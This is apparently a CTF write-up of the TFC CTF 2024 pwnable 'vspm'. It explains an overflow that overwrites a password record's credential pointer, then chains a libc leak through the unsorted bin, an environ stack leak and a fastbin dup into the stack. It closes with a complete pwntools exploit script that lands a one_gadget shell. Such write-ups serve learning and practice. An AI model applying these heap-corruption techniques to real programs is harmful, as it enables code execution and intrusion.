+++
title = "TFC CTF 2024 - vspm"
date = "2024-08-21"
description = "TFC CTF 2024 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "heap manipulation", "unsorted bin", "double free", "fastbin dup into stack"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/vspm'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```

### Structure
``` c
struct password {
    char *credential;
    char name[0x20];
}
```

This structure can store up to 10 entries in the `code_base + 0x4060` region.


## 0x01. Vulnerability
``` c
unsigned __int64 save_12EE()
{
  ...
  __isoc99_scanf("%d", &len);
  getchar();
  if ( len >= 0x79 )
  {
    puts("Sorry, not enough resources!");
    exit(0);
  }
  ...
  password_4060[i].credential = malloc(len);
  printf("Enter credentials: ");
  read(0, password_4060[i].credential, (len + 1));
  printf("Name of the credentials: ");
  read(0, password_4060[i].name, (len + 1));
  ...
}
```

In the `save()` function for storing passwords, the user inputs the size `len` for `credential`, then reads `len + 1` bytes.
However, since the fixed-length(0x20) `name` also reads `len + 1` bytes, we can overwrite the next `password` structure's `credential`.

While we can write `len + 1` bytes in `credential` to overwrite the first byte of the next chunk's header, I couldn't find an exploitation path by modifying `prev_size`.


## 0x02. Exploit
Before proceeding with exploitation, checking the protections reveals that all regions (code, stack, libc) are randomized.
With the current `credential` overwrite vulnerability, I needed to leak at least one memory region.

### Libc Leak
One commonly used heap memory leak technique involves leaking `main_arena` through the unsorted bin.
Since `main_arena` is in the libc region, we can obtain the libc base by calculating the offset.

The problem is that chunks need to be at least 0x80 bytes to be sent to the unsorted bin when freed, but the maximum input `len` is 0x79.
Since heap chunks are allocated sequentially and only the `0xXXXXXXXXXXXXX000` portion of the address varies, I can construct a fake chunk and use the `credential` overwrite vulnerability to make the next `password` structure's `credential` point to it:

``` python
    payload = p64(0)                                # fake chunk -> prev_size
    payload += p64(0x111)                           # fake chunk -> size
    save(s, 0x30, payload, b"0000")
    save(s, 0x30, b"BBBB", b"1111")
    save(s, 0x30, b"CCCC", b"2222")
    save(s, 0x40, b"DDDD", b"3333")
    save(s, 0x30, payload, b"4444")
    save(s, 0x60, b"FFFF", b"5555")
    save(s, 0x60, b"GGGG", b"6666")
```

First, arrange the chunks considering the offset differences between `0000`, `4444`, and the top chunk.

Initially, I thought I only needed to consider the offset between `0000` and `4444`, but the offset with the top chunk also needs to match for successful fake chunk `free`:

``` bash
# first password structure
gef➤  x/5gx 0x555555558060
0x555555558060: 0x000055555555d010      0x0000000030303030
0x555555558070: 0x0000000000000000      0x0000000000000000
0x555555558080: 0x0000000000000000
# first fake chunk header
gef➤  x/2gx 0x000055555555d010
0x55555555d010: 0x0000000000000000      0x0000000000000111
# second fake chunk header
gef➤  x/2gx 0x000055555555d010 + 0x110
0x55555555d120: 0x0000000000000000      0x0000000000000111
# top chunk
gef➤  x/2gx 0x000055555555d010 + 0x220
0x55555555d230: 0x0000000000000000      0x0000000000020dd1
```

Now to make `2222`'s `credential` point to the fake chunk:

``` python
    delete(s, b"1")                                 # free "1111"
    save(s, 0x30, b"BBBB", b"1" * 0x20 + b"\x20")   # alloc "1111" and overwrite next pointer
    delete(s, b"2")                                 # free fake chunk -> unsorted bin
```

Using `1111` to make `2222`'s `credential` point to `0x55555555d020` makes the value at `0x55555555d010` act as the chunk header.
When we free `2222`, it's treated as freeing a 0x100-sized chunk and moves to the unsorted bin:

``` bash
────────────────────────── Unsorted Bin for arena at 0x7ffff7dd0b60 ──────────────────────────
[+] unsorted_bins[0]: fw=0x55555555d010, bk=0x55555555d010
 →   Chunk(addr=0x55555555d020, size=0x110, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
gef➤  x/4gx 0x55555555d010
0x55555555d010: 0x0000000000000000      0x0000000000000111
0x55555555d020: 0x00007ffff7dd0bc0      0x00007ffff7dd0bc0
```

During this process, the freed chunk's `fd` and `bk` get written with `main_arena` addresses.
Since memory isn't cleared when the region is returned via `malloc`, we can leak it through `check()`.

Fortunately, requesting a chunk smaller than 0x100 still allocates from the unsorted bin by splitting it, so I requested a 0x30-sized chunk:

``` python
    save(s, 0x30, b"\xc0", b"2222")                 # alloc from unsorted bin
    r = check(s)
    arena = 0x3b4cc0
    libc = u64(r.split(b"2222 --> ")[1][:6] + b"\x00\x00") - arena
    log.info(f"libc : {hex(libc)}")
```

The `\xc0` I input is the first byte of `main_arena` from the debugger. While we don't need to match it since we calculate the offset anyway, we need to provide some input, so I matched it.

### Stack Leak
With the libc leak successful, I can now print any libc region using `credential` overwrite and `check()`.
The `environ` variable in the libc region stores a stack address, so I used this for stack leak:

``` python
    delete(s, b"0")
    environ = 0x3b75d8
    payload = b"0" * 0x20
    payload += p64(libc + environ)
    save(s, 0x30, b"AAAA", payload)
```

First, free `0000` and overwrite so `1111`'s `credential` points to `environ`:

``` python
    r = check(s)
    stack = u64(r.split(b"1111 --> ")[1][:6] + b"\x00\x00") - 0x110
    log.info(f"stack : {hex(stack)}")
```

Since `1111` points to `environ` and `check()` prints `credential` information, we can obtain the stack address stored in `environ`.

### Fastbin Dup into Stack
Similar to using the `credential` overwrite vulnerability to point to a fake chunk, we can trigger a double free vulnerability by pointing to another `credential`:

``` python
    save(s, 0x60, b"FFFF", b"5555")
    save(s, 0x60, b"GGGG", b"6666")
    save(s, 0x60, b"HHHH", b"7777")
```

After executing this payload, the `password` structures contain:

``` bash
gef➤
0x555555558128: 0x000055555555d1d0      0x0000000035353535
0x555555558138: 0x0000000000000000      0x0000000000000000
0x555555558148: 0x0000000000000000
gef➤
0x555555558150: 0x000055555555d160      0x0000000036363636
0x555555558160: 0x0000000000000000      0x0000000000000000
0x555555558170: 0x0000000000000000
gef➤
0x555555558178: 0x000055555555d240      0x0000000037373737
0x555555558188: 0x0000000000000000      0x0000000000000000
0x555555558198: 0x0000000000000000
```

To trigger the double free vulnerability, we need to overwrite `7777`'s `0x55555555d240` with `5555`'s `0x55555555d1d0`.

The reason for using 0x60-sized `credential` will be explained later.
Since we allocate three 0x60-sized chunks, the second byte of the chunk address differs.
In `0xd1d0`, the `0x1d0` is fixed and only the `0xd000` portion varies, creating a 1/16 probability for successful exploitation.

While it might be possible to manipulate fastbin carefully or perform heap leak, the probability wasn't too low, so I proceeded as is:

``` python
    delete(s, b"6")
    save(s, 0x60, b"GGGG", b"6" * 0x20 + b"\xd0\xd1")
    
    delete(s, b"5")
    delete(s, b"6")
    delete(s, b"7")
```

As in the payload above, matching `7777`'s `credential` with `5555`'s and freeing in order `5555`, `6666`, `7777` results in:

- `0x55555555d1d0` -> `0x55555555d160` -> `0x55555555d1d0`

Now requesting the 0x60-sized chunk via `malloc` returns `0x55555555d1d0`.
If we write a stack address here and can write a fake chunk header at that address, it gets added to the fastbin list.

So I searched for a stack location where I could construct a fake chunk header. Initially, I tried using `save()` function's stack:

``` c
unsigned __int64 save_12EE()
{
  unsigned int len; // [rsp+8h] [rbp-68h] BYREF
  int i; // [rsp+Ch] [rbp-64h]
  ...
}
```

Constructing a fake chunk header using `len` and `i` gives 0x70 bytes to the return address, which is less than the maximum allocation size of 0x78, so it seemed feasible.

However, there's a contradiction: to allocate a 0x70-sized chunk, we need to input 0x70 for `len`, but when constructing the fake chunk header, we need to input 0x80 for the `size` to match.

So I needed to find another area.
Since there's no function that terminates by returning, I realized that when allocating and reading in `save()`, overwriting `read()`'s return address might work:

``` c
unsigned __int64 save_12EE()
{
  ...
  password_4060[i].credential = malloc(len);
  printf("Enter credentials: ");
  read(0, password_4060[i].credential, (len + 1));
  ...
}
```

The problem again is the fake chunk header.
Checking the area that can overwrite `read()`'s return address just before `malloc()`:

``` bash
gef➤  x/16gx 0x7fffffffdbd0
0x7fffffffdbd0: 0x0000000000000000      0x0000000000000000
0x7fffffffdbe0: 0x00007fffffffdce0      0x00007ffff7a6dd8e
0x7fffffffdbf0: 0x00007ffff7ff4000      0x0000003000000008
0x7fffffffdc00: 0x00007fffffffdcd0      0x00007fffffffdc10
0x7fffffffdc10: 0x000000000000000a      0x00007fffffffdcd4
0x7fffffffdc20: 0x0000000000000000      0x00007ffff7b030c3
0x7fffffffdc30: 0x0000000000000000      0x00007fffffffdcc0
0x7fffffffdc40: 0x00005555555551a0      0x0000555555555397
```

While 0x60 is stored at `0x7fffffffdbf8`, this value was stored during internal logic execution after being passed as an argument to `malloc()`, creating the same contradiction.

Here's the trick: chunk headers don't need proper alignment, so considering that the highest byte of stack addresses is `0x7f`, I examined memory again:

``` bash
gef➤  x/16gx 0x7fffffffdbd5
0x7fffffffdbd5: 0x0000000000000000      0xffffffdce0000000
0x7fffffffdbe5: 0xfff7a6dd8e00007f      0xfff7ff400000007f
0x7fffffffdbf5: 0x300000000800007f      0xffffffdcd0000000
0x7fffffffdc05: 0xffffffdc1000007f      0x000000000a00007f
0x7fffffffdc15: 0xffffffdcd4000000      0x000000000000007f
0x7fffffffdc25: 0xfff7b030c3000000      0x000000000000007f
0x7fffffffdc35: 0xffffffdcc0000000      0x55555551a000007f
0x7fffffffdc45: 0x5555555397000055      0x555555618f000055
```

There are two areas that can be used as fake chunk headers: `0x7fffffffdc15` and `0x7fffffffdc25`.
Setting `fd` to `0x7fffffffdc15` fails `malloc()`, while `0x7fffffffdc25` succeeds.

The supposed reason is that this area is just above the current function's stack, overlapping with `malloc()`'s stack region, and values stored at `0x7fffffffdc15` get overwritten as `malloc()` uses its stack internally.

Anyway, to set `0x7fffffffdc25` as `fd`, after calculating the offset with the acquired stack address and allocating `0x55555555d1d0`, the fastbin is configured as:

- `0x55555555d160` -> `0x55555555d1d0` -> `0x7fffffffdc35`

Therefore, the third `malloc()` returns the stack address, and we can calculate the offset to overwrite `read()`'s return address with a one-shot gadget:

``` python
    payload = p64(stack - 0xa3)
    save(s, 0x60, payload, b"5555")
    save(s, 0x60, b"GGGG", b"6666")
    save(s, 0x60, payload, b"7777")
    
    delete(s, b"0")
    one_gadget = 0xe1fa1
    payload = b"A" * 0x13
    payload += p64(libc + one_gadget)
    save(s, 0x68, payload, b"0000", fin = 1)
```


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "vspm"
code_base = 0x0000555555554000
bp = {
    'save' : code_base + 0x12EE,
    'malloc_of_save' : code_base + 0x1414,
    'check' : code_base + 0x14ED,
    'cred' : code_base + 0x4060,
}

gs = f'''
continue
b *{bp['malloc_of_save']}
'''
context.terminal = ['tmux', 'splitw', '-hf']

def save(s, length, cred, name, fin = 0):
    s.sendline(b"1")
    s.recvuntil(b"length: ")
    s.sendline(str(length).encode())
    s.recvuntil(b"credentials: ")
    s.send(cred)
    if fin:
        return
    s.recvuntil(b"credentials: ")
    s.send(name)
    return s.recvuntil(b"Input: ")

def check(s):
    s.sendline(b"2")
    return s.recvuntil(b"Input: ")

def delete(s, index):
    s.sendline(b"3")
    s.recvuntil(b"index: ")
    s.sendline(index)
    return s.recv()

def main(port, debug):
    if(port):
        s = remote("0.0.0.0", port)
    else:
        s = process(BINARY)
        if debug:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    log.info(f"cred : {hex(bp['cred'])}")
    s.recv()

    payload = p64(0)                                # fake chunk -> prev_size
    payload += p64(0x111)                           # fake chunk -> size
    save(s, 0x30, payload, b"0000")
    save(s, 0x30, b"BBBB", b"1111")
    save(s, 0x30, b"CCCC", b"2222")
    save(s, 0x40, b"DDDD", b"3333")
    save(s, 0x30, payload, b"4444")
    save(s, 0x60, b"FFFF", b"5555")
    save(s, 0x60, b"GGGG", b"6666")

    # libc leak
    delete(s, b"1")                                 # free "1111"
    save(s, 0x30, b"BBBB", b"1" * 0x20 + b"\x20")   # alloc "1111" and overwrite next pointer
    delete(s, b"2")                                 # free fake chunk -> unsorted bin
    save(s, 0x30, b"\xc0", b"2222")                 # alloc from unsorted bin
    
    r = check(s)
    arena = 0x3b4cc0
    libc = u64(r.split(b"2222 --> ")[1][:6] + b"\x00\x00") - arena
    log.info(f"libc : {hex(libc)}")
    
    # flush unsorted bin
    save(s, 0x60, b"HHHH", b"7777")
    save(s, 0x50, b"IIII", b"8888")
    delete(s, b"7")
    delete(s, b"8")

    # stack leak
    delete(s, b"0")
    environ = 0x3b75d8
    payload = b"0" * 0x20
    payload += p64(libc + environ)
    save(s, 0x30, b"AAAA", payload)

    r = check(s)
    stack = u64(r.split(b"1111 --> ")[1][:6] + b"\x00\x00") - 0x110
    log.info(f"stack : {hex(stack)}")

    # fastbin dup
    delete(s, b"5")
    delete(s, b"6")

    save(s, 0x60, b"FFFF", b"5555")
    save(s, 0x60, b"GGGG", b"6666")
    save(s, 0x60, b"HHHH", b"7777")
    pause()

    delete(s, b"6")
    save(s, 0x60, b"GGGG", b"6" * 0x20 + b"\xd0\xd1")
    
    delete(s, b"5")
    delete(s, b"6")
    delete(s, b"7")
    
    payload = p64(stack - 0xa3)
    save(s, 0x60, payload, b"5555")
    save(s, 0x60, b"GGGG", b"6666")
    save(s, 0x60, payload, b"7777")
    
    delete(s, b"0")
    one_gadget = 0xe1fa1
    payload = b"A" * 0x13
    payload += p64(libc + one_gadget)
    save(s, 0x68, payload, b"0000", fin = 1)

    s.interactive()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()
    main(args.port, args.debug)
```